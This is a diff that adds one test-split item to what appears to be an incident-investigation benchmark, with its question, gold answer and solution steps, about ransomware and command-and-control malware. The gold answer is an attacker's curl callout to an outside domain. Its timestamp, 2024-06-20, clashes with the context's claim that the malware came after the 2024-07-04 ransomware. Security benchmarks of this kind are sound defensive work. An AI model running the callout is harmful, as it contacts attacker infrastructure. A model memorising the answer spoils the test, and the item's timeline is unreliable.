@@ -1,0 +1,27 @@
+{
+  "task_id": "incident_5_test_q013",
+  "incident": "incident_5",
+  "split": "test",
+  "context": "On 2024-07-04, a ransomware payload was remotely launched on a device, which might have aimed to encrypt content and render it unusable. This malicious activity originated from the IP address `99.83.111.100`. Thereafter, 'CommandAndControl' malware was identified on the device, suggesting an attempted lateral movement by the attacker.",
+  "question": "What is the command line of the process that was executed when the 'CommandAndControl' malware was detected during lateral movement?",
+  "gold_answer": "curl http://vectorsandarrows.com",
+  "solution_steps": [
+    "The ransomware payload was remotely launched on the account `dp5hn` at `2024-07-04 22:35:01.951341+00:00`.",
+    "The 'CommandAndControl' malware was detected during lateral movement. The attacker's command line was `curl http://vectorsandarrows.com` and it was executed with Process ID `5572` on `2024-06-20t09:32:04.8002759z`."
+  ],
+  "metadata": {
+    "start_alert": 112,
+    "end_alert": 128,
+    "start_entities": [
+      42
+    ],
+    "end_entities": [
+      6
+    ],
+    "shortest_alert_path": [
+      112,
+      1,
+      128
+    ]
+  }
+}
